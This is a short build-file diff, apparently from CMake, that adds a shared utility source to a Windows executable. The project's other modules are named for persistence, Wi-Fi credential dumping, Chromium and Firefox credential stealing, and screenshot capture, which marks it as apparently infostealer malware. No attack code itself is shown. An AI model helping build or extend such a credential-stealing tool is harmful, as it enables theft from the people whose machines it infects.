@@ -48,6 +48,7 @@ add_executable(main WIN32
     src/persistence/Persistence.cpp
     src/wifi/WifiDumper.cpp
     src/utils/Exec.cpp
+    src/utils/Shared.cpp
     src/credential/ChromiumStealer.cpp
     src/credential/FirefoxStealer.cpp
     src/capture/Screenshot.cpp
